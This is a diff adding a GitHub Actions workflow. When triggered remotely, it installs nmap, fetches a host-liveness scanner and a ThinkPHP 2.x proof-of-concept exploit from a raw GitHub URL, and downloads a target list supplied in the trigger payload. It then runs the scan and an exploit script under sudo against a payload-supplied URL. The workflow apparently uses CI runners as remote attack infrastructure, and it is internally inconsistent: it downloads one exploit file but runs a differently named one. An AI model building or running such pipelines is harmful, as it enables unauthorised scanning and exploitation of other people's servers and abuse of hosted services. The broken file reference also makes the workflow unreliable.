@@ -1,0 +1,37 @@
+on:
+  repository_dispatch:
+    types: [ThinkPHP2.x]
+
+jobs:
+  build:
+  
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        python-version: [3.8]
+    steps:
+      - name: Set up Python ${{ matrix.python-version }}
+        uses: actions/setup-python@v2
+        with:
+          python-version: ${{ matrix.python-version }}
+      - name: install nmap 
+        run: |
+          sudo apt install nmap -y
+      - name: Install dependencies
+        run: |
+          sudo python -m pip install requests
+          sudo python -m pip install python-nmap
+      - name: get aliveScan
+        run: |
+          curl -O https://raw.githubusercontent.com/lisa-hue/test-action/main/alive_scan.py
+          curl -O https://raw.githubusercontent.com/lisa-hue/test-action/main/poc/ThinkPHP2.x.py
+          curl -o host.txt ${{ github.event.client_payload.downloadurl }}
+
+      - name: alive_scan run
+        run: |
+          sudo python alive_scan.py
+          
+      - name: ThinkPHP2.x run
+        run: |
+          sudo python jquery_upload_file.py -u ${{ github.event.client_payload.url }} -uid ${{ github.event.client_payload.uuid }} -sid ${{ github.event.client_payload.scan_id }}
